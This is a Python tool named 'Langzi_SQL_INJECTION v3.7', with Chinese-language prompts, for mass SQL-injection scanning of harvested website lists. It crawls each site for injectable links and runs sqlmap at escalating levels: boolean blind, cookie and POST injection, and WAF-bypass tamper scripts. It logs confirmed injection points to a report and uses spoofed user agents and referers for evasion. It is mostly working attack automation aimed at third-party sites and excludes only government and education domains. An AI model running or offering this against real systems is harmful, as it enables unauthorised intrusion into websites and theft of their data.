# -*- coding:utf-8 -*-
import subprocess
import os
import random
import re
import requests
import time
import multiprocessing
from bs4 import BeautifulSoup
import sys
requests.packages.urllib3.disable_warnings()

os_python = os.path.join(os.getcwd(), 'lib\python.exe')
os_sqlmap = os.path.join(os.getcwd(), 'lib\sqlmap\\')
os_run = os_python + ' ' + os_sqlmap


def writedata(x):
    with open('log.txt', 'a+')as aa:
        aa.write('-------------------------------------' + '\n')
        aa.write(str(time.strftime('%Y-%m-%d:%H:%M:%S   ', time.localtime())) + x + '\n')


REFERERS = [
    "https://www.baidu.com",
    "http://www.baidu.com",
    "https://www.google.com.hk",
    "http://www.so.com",
    "http://www.sogou.com",
    "http://www.soso.com",
    "http://www.bing.com",
]

headerss = [
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1",
    "Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
    "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"]

headers = {
    'User-Agent': random.choice(headerss),
    'Accept': 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Cache-Control': 'max-age=0',
    'referer': random.choice(REFERERS),
    'Accept-Charset': 'GBK,utf-8;q=0.7,*;q=0.3',
}


def get_links(url):
    '''
    需要的有常规的注入点
        1. category.php?id=17
        2. https://www.yamibuy.com/cn/brand.php?id=566
    伪静态
        1. info/1024/4857.htm
        2. http://news.hnu.edu.cn/zhyw/2017-11-11/19605.html
    :param url:
    :return:
    '''
    time.sleep(random.randint(1,6))
    if 'gov.cn' in url or 'edu.cn' in url:
        return 0
    domain = url.split('//')[1].strip('/').replace('www.', '')
    result = []
    id_links = []
    html_links = []
    result_links = {}
    html_links_s = []
    result_links['title'] = '网址标题获取失败'
    idid = []
    htht = []
    try:
        headers = {
            'User-Agent': random.choice(headerss),
            'Accept': 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Cache-Control': 'max-age=0',
            'Accept-Charset': 'GBK,utf-8;q=0.7,*;q=0.3',
        }
        rxww = requests.get(url, headers=headers,verify=False, timeout=10)
        soup = BeautifulSoup(rxww.content, 'html.parser',from_encoding='iso-8859-1')

        try:
            encoding = requests.utils.get_encodings_from_content(rxww.text)[0]
            res = rxww.content.decode(encoding, 'replace')
            title_pattern = '<title>(.*?)</title>'
            title = re.search(title_pattern, res, re.S | re.I)
            result_links['title'] = str(title.group(1))
        except:
            pass


        if result_links['title'] == '' or result_links['title'] == None:
            result_links['title'] = '网址标题获取失败'
        links = soup.findAll('a')
        for link in links:
            _url = link.get('href')
            res = re.search('(javascript|:;|#)', str(_url))
            res1 = re.search('.(jpg|png|bmp|mp3|wma|wmv|gz|zip|rar|iso|pdf|txt)', str(_url))
            if res == None and res1 == None:
                result.append(str(_url))
            else:
                pass

        if result != []:
            rst = list(set(result))
            for rurl in rst:
                if '//' in rurl and 'http' in rurl:
                    # https://www.yamibuy.com/cn/search.php?tags=163
                    # http://news.hnu.edu.cn/zhyw/2017-11-11/19605.html
                    if domain in rurl:
                        if '?' in rurl and '=' in rurl:
                            # result_links.append(rurl)
                            id_links.append(rurl)
                        if '.html' in rurl or '.shtml' in rurl or '.htm' in rurl or '.shtm' in rurl:
                            if '?' not in rurl:
                                # result_links.append(rurl)
                                html_links.append(rurl)
                # //wmw.dbw.cn/system/2018/09/25/001298805.shtml
                elif 'http' not in rurl and domain in rurl:
                    if '?' in rurl and '=' in rurl:
                        id_links.append('http://' + rurl.lstrip('/'))
                    if '.html' in rurl or '.shtml' in rurl or '.htm' in rurl or '.shtm' in rurl:
                        if '?' not in rurl:
                            html_links.append('http://' + rurl.lstrip('/'))

                # /chanpin/2018-07-12/3.html"
                elif 'http' not in rurl and domain not in rurl:
                    if '?' in rurl and '=' in rurl:
                        id_links.append('http://' + domain + '/' + rurl.lstrip('/'))
                    if '.html' in rurl or '.shtml' in rurl or '.htm' in rurl or '.shtm' in rurl:
                        if '?' not in rurl:
                            html_links.append('http://' + domain + '/' + rurl.lstrip('/'))

                else:
                    # search.php?tags=163
                    if '?' in rurl and '=' in rurl:
                        # result_links.append(url + '/' + rurl)
                        id_links.append(url + '/' + rurl)
                    if '.html' in rurl or '.shtml' in rurl or '.htm' in rurl or '.shtm' in rurl:
                        # result_links.append(url + '/' + rurl)
                        if '?' not in rurl:
                            html_links.append(url + '/' + rurl)



            for x1 in html_links:
                try:
                    rx1 = requests.head(url=x1, headers=headers,verify=False, timeout=15).status_code
                    if rx1 == 200:
                        htht.append(x1)
                except Exception as e:
                    writedata('[WARNING ERROR]' + str(e))
                    pass
            for x2 in id_links:
                try:
                    rx2 = requests.head(url=x2, headers=headers, verify=False, timeout=15).status_code
                    if rx2 == 200:
                        idid.append(x2)
                except Exception as e:
                    writedata('[WARNING ERROR]' + str(e))
                    pass

            if htht == []:
                pass
            else:
                for x in htht:
                    if x.count('/') > 3:
                        ra = re.search('.*?/[0-9]\.', str(x))
                        if ra == None:
                            pass
                        else:
                            html_links_s.append(x)
                        if html_links_s == []:
                            html_links_s.append(random.choice(htht))

                if html_links_s == []:
                    result_links['html_links'] = random.choice(htht)
                else:
                    result_links['html_links'] = random.choice(html_links_s)

            if idid == []:
                pass
            else:
                result_links['id_links'] = random.choice(idid)
        if result_links == {}:
            return None
        else:
            return result_links

    except Exception as e:
        writedata('[WARNING ERROR]' + str(e))
        pass
    return None


def check(result, url, common, title='获取标题失败'):
    url = url.replace('^', '')
    if '---' in result:
        if 'sqlmap was not able to fingerprint the back-end database management syste' not in result:
            try:
                result_info = re.search('---(.*?)---.*?\[INFO\] (the back-end DBMS is .*?)\[', result, re.S)
                inj = result_info.group(1)
                dbs = result_info.group(2)
                with open('result.txt', 'a+',encoding='utf-8') as ae:
                    ae.write('-------------------------------------------------\n')
                    ae.write('发现时间 : ' + str(time.strftime('%Y-%m-%d:%H:%M:%S', time.localtime())) + '\n')
                    ae.write('网站标题 : ' + title + '\n')
                    ae.write('注入网址 : ' + url + '\n')
                    ae.write('执行命令 : ' + common + '\n')
                    ae.write(inj.replace('Parameter: ', '注入参数(方式) : ').replace('Type: ', '注入方式 : ').replace('Title: ',
                                                                                                            '注入标题 : ').replace(
                        'Payload: ', '注入攻击 : ') + '\n')
                    if 'back-end DBMS' in dbs:
                        ae.write(
                            dbs.replace('the back-end DBMS is ', '数据库类型 : ').replace('web server operating system: ',
                                                                                     '服务器版本 : ').replace(
                                'web application technology: ', '服务器语言 : ').replace('back-end DBMS: ',
                                                                                    '数据库版本 : ') + '\n')
                    else:
                        ae.write('\n' + '可能存在注入但被拦截,或者无法识别数据库版本' + '\n')

                    return 'INJ'
            except Exception as e:
                writedata('[WARNING ERROR]' + str(e))
        else:
            try:
                result_info = re.search('---(.*?)---.*?INFO\] (.*?)\[', result, re.S)
                inj = result_info.group(1)
                with open('result.txt', 'a+',encoding='utf-8') as ae:
                    ae.write('-------------------------------------------------\n')
                    ae.write('发现时间 : ' + str(time.strftime('%Y-%m-%d:%H:%M:%S', time.localtime())) + '\n')
                    ae.write('网站标题 : ' + title + '\n')
                    ae.write('注入网址 : ' + url + '\n')
                    ae.write('执行命令 : ' + common + '\n')
                    ae.write(inj.replace('Parameter: ', '注入参数(方式) : ').replace('Type: ', '注入方式 : ').replace('Title: ',
                                                                                                            '注入标题 : ').replace(
                        'Payload: ', '注入攻击 : ') + '\n')
                    ae.write('\n' + '存在注入但无法识别数据库版本' + '\n')
                    return 'INJ'
            except Exception as e:
                writedata('[WARNING ERROR]' + str(e))

from  multiprocessing import Queue
from multiprocessing import queues
queues.Queue
def scan_level_0(url, title):
    url = url.replace('&', '^&')
    comm = os_run + 'sqlmap.py -u %s --technique B --batch --thread=10 --random-agent' % url
    print('Level 0 : ' + url.replace('^', '').replace('*', ''))
    writedata(comm)
    try:
        res = subprocess.Popen(comm, shell=True, stdout=subprocess.PIPE)
        result = res.stdout.read().decode()
        writedata(result)
        inj = check(result, url=url, common=comm, title=title)
    except Exception as e:
        writedata('[WARNING ERROR]' + str(e))
        pass
    finally:
        res.terminate()
        return inj

def scan_level_1(url, title):
    url = url.replace('&', '^&')
    comm = os_run + 'sqlmap.py -u %s --batch --thread=10 --random-agent' % url
    print('Level 1 : ' + url.replace('^', '').replace('*', ''))
    writedata(comm)
    try:
        res = subprocess.Popen(comm, shell=True, stdout=subprocess.PIPE)
        result = res.stdout.read().decode()
        writedata(result)
        inj = check(result, url=url, common=comm, title=title)
    except Exception as e:
        writedata('[WARNING ERROR]' + str(e))
        pass
    finally:
        res.terminate()
        return inj


def scan_level_2(url, title):
    urls, datas = url.split('?')[0], url.split('?')[1]
    urls = urls.replace('&', '^&')
    datas = datas.replace('&', '^&')
    comm_cookie = os_run + "sqlmap.py -u {} --cookie {} --level 2 --batch --thread=10 --random-agent".format(urls,
                                                                                                             datas)
    print('Level 2 : ' + url.replace('^', '').replace('*', ''))
    comm_post = os_run + "sqlmap.py -u {} --data {} --level 2 --batch --thread=10 --random-agent".format(urls, datas)
    writedata(comm_post)
    writedata(comm_cookie)

    try:
        res = subprocess.Popen(comm_cookie, shell=True, stdout=subprocess.PIPE)
        result = res.stdout.read().decode()
        writedata(result)
        inj = check(result, url=url, common=comm_cookie, title=title)
    except Exception as e:
        writedata('[WARNING ERROR]' + str(e))
        pass
    finally:
        res.terminate()
        if inj == 'INJ':
            return inj

    try:
        res = subprocess.Popen(comm_post, shell=True, stdout=subprocess.PIPE)
        result = res.stdout.read().decode()
        writedata(result)
        inj = check(result, url=url, common=comm_post, title=title)
    except Exception as e:
        writedata('[WARNING ERROR]' + str(e))
        pass
    finally:
        res.terminate()
        return inj


def scan_level_3(url, title):
    url = url.replace('&', '^&')
    comm = os_run + 'sqlmap.py -u %s --batch --tamper space2comment.py --thread=10 --random-agent' % url
    print('Level 3 : ' + url.replace('^', '').replace('*', ''))
    writedata(comm)
    try:
        res = subprocess.Popen(comm, shell=True, stdout=subprocess.PIPE)
        result = res.stdout.read().decode()
        writedata(result)

        inj = check(result, url=url, common=comm, title=title)
    except Exception as e:
        writedata('[WARNING ERROR]' + str(e))
        pass
    finally:
        res.terminate()
        return inj


def scan_level_4(url, title):
    urls, datas = url.split('?')[0], url.split('?')[1]
    urls = urls.replace('&', '^&')
    datas = datas.replace('&', '^&')
    comm_cookie = os_run + "sqlmap.py -u {} --cookie {} --level 2 --tamper space2comment.py --batch --thread=10 --random-agent".format(
        urls, datas)
    print('Level 4 : ' + url.replace('^', '').replace('*', ''))
    comm_post = os_run + "sqlmap.py -u {} --data {} --level 2 --tamper space2comment.py --batch --thread=10 --random-agent".format(
        urls, datas)
    writedata(comm_cookie)
    writedata(comm_post)

    try:
        res = subprocess.Popen(comm_cookie, shell=True, stdout=subprocess.PIPE)
        result = res.stdout.read().decode()
        writedata(result)

        inj = check(result, url=url, common=comm_cookie, title=title)
    except Exception as e:
        writedata('[WARNING ERROR]' + str(e))
        pass
    finally:
        res.terminate()
        if inj == 'INJ':
            return inj

    try:
        res = subprocess.Popen(comm_post, shell=True, stdout=subprocess.PIPE)
        result = res.stdout.read().decode()
        writedata(result)
        inj = check(result, url=url, common=comm_post, title=title)
    except Exception as e:
        writedata('[WARNING ERROR]' + str(e))
        pass
    finally:
        res.terminate()
        return inj


def scan_level_5(url, title):
    # 获取完整注入url即可
    url = url.replace('&', '^&')
    comm = os_run + 'sqlmap.py -u {} --batch --tamper space2comment.py --delay 2 --time-sec=15 --timeout=20  --level 5 --thread=10 --random-agent'.format(
        url)
    print('Level 5 : ' + url.replace('^', '').replace('*', ''))
    writedata(comm)

    try:
        res = subprocess.Popen(comm, shell=True, stdout=subprocess.PIPE)
        result = res.stdout.read().decode()
        writedata(result)

        inj = check(result, url=url, common=comm, title=title)
    except Exception as e:
        writedata('[WARNING ERROR]' + str(e))
        pass
    finally:
        res.terminate()
        return inj


def scan_html(url, title, level):
    urlse = url.replace('.htm', '*.htm').replace('.shtm', '*.shtm')
    urls = urlse.replace('&', '^&')
    if level == 1 or level == 2 or level == 0:
        comm = os_run + 'sqlmap.py -u {} --batch --thread=10 --random-agent'.format(urls)
        if level == 1:
            print('Level 1 : ' + urls.replace('^', '').replace('*', ''))
        if level == 2:
            print('Level 2 : ' + urls.replace('^', '').replace('*', ''))
        if level == 0:
            print('Level 0 : ' + urls.replace('^', '').replace('*', ''))

    if level == 3 or level == 4:
        comm = os_run + 'sqlmap.py -u %s --batch --tamper space2comment.py --thread=10 --random-agent' % urls
        if level == 3:
            print('Level 3 : ' + urls.replace('^', '').replace('*', ''))
        else:
            print('Level 4 : ' + urls.replace('^', '').replace('*', ''))
    if level == 5:
        comm = os_run + 'sqlmap.py -u {} --batch --tamper space2comment.py --delay 2 --time-sec=15 --timeout=20  --level 5 --thread=10 --random-agent'.format(
            urls)
        print('Level 5 : ' + urls.replace('^', '').replace('*', ''))
    writedata(comm)

    try:
        res = subprocess.Popen(comm, shell=True, stdout=subprocess.PIPE)
        result = res.stdout.read().decode()
        writedata(result)

        check(result, url=url, common=comm, title=title)
    except Exception as e:
        writedata('[WARNING ERROR]' + str(e))
        pass
    finally:
        res.terminate()


def get_url_sql(url, level=1):
    link = get_links(url)
    if link == None:
        pass
    else:
        if 'html_links' in link.keys():
            scan_html(link['html_links'].replace(' ', ''), link['title'], level)
        if 'id_links' in link.keys():
            if level == 0:
                scan_level_0(link['id_links'].replace(' ', ''), link['title'])
            if level == 1:
                scan_level_1(link['id_links'].replace(' ', ''), link['title'])
            if level == 2:
                scan_level_2(link['id_links'].replace(' ', ''), link['title'])
            if level == 3:
                scan_level_3(link['id_links'].replace(' ', ''), link['title'])
            if level == 4:
                scan_level_4(link['id_links'].replace(' ', ''), link['title'])
            if level == 5:
                scan_level_5(link['id_links'].replace(' ', ''), link['title'])
            if level == 6:
                dix0 = scan_level_0(link['id_links'].replace(' ', ''), link['title'])
                if dix0 != None:
                    return dix0

                dix1 = scan_level_1(link['id_links'].replace(' ', ''), link['title'])
                if dix1 != None:
                    return dix1
                dix2 = scan_level_2(link['id_links'].replace(' ', ''), link['title'])
                if dix2 != None:
                    return dix2
                dix3 = scan_level_3(link['id_links'].replace(' ', ''), link['title'])
                if dix3 != None:
                    return dix3
                dix4 = scan_level_4(link['id_links'].replace(' ', ''), link['title'])
                if dix4 != None:
                    return dix4
                dix5 = scan_level_5(link['id_links'].replace(' ', ''), link['title'])
                if dix5 != None:
                    return dix5


if __name__ == '__main__':
    multiprocessing.freeze_support()
    print('''

             _                           _
            | |                         (_)
            | |     __ _ _ __   __ _ _____
            | |    / _` | '_ \ / _` |_  / |
            | |___| (_| | | | | (_| |/ /| |
            |______\__,_|_| |_|\__, /___|_|
                                __/ |      Langzi_SQL_INJECTION
                               |___/       Version:3.7
                                           Datetime:2019-03-09

    ''')
    time.sleep(3)
    print('''
    
        Description:
            Langzi_SQL_INJECTION v3.7版本是一款批量检测SQL注入漏洞的自动化工具
            对采集导入网址根据设置扫描等级进行全自动化扫描检测生成漏洞报告
            通过SQLMAP提供的API实现批量注入检测，扫描结果可百分百完全复现
            支持伪静态注入，cookie注入，post注入，加载绕过WAF的Tamper检测注入
            适用于6-80岁年龄段人群使用，简单，便捷，批量，自动生成检测结果
        
        Level:
            level 0 : 仅仅使用BOOL类型的盲注检测
            level 1 : 使用多种类型判断注入方式
            level 2 : 支持cookie注入与post注入方式
            level 3 : 调用目录下绕过安全狗Tamper脚本检测
            level 4 : 调用Tamper绕过WAF加测cookie注入与post注入
            level 5 : 加载时间延迟与Tamper高风险等级注入
            level 6 : 调用0-5所有级别进行注入，直到成功完成注入检测
            
        Tips:    
            禁止对GOV-EDU进行检测
            在WIN 7 下不兼容运行
            运行目录不能存在中文字符
    
    ''')
    time.sleep(6)
    New_start = input(('把采集的url文本拖拽进来:'))
    levels = int(input(('设置扫描等级(0/1/2/3/4/5/6):')))
    countss = int(input(('设置扫描进程数(2-36):')))
    p = multiprocessing.Pool(countss)
    list_ = list(set(
        [x.replace('\n', '') if x.startswith('http') else 'http://' + x.replace('\n', '') for x in
         open(New_start, 'r').readlines()]))
    for x in list_:
        if 'gov.cn' in x:
            sys.exit()
        if 'edu.cn' in x:
            sys.exit()


    for x in list_:
        # p.apply(get_url_sql, args=(x, levels))
        p.apply_async(get_url_sql, args=(x, levels))
    p.close()
    p.join()
    print('浪子哥哥提醒您，此次任务扫完了哦，快去看看抓到了几个漏洞吧~')
    time.sleep(300)
    time.sleep(300)
    time.sleep(300)
    time.sleep(300)
    time.sleep(300)
    time.sleep(300)
    time.sleep(300)
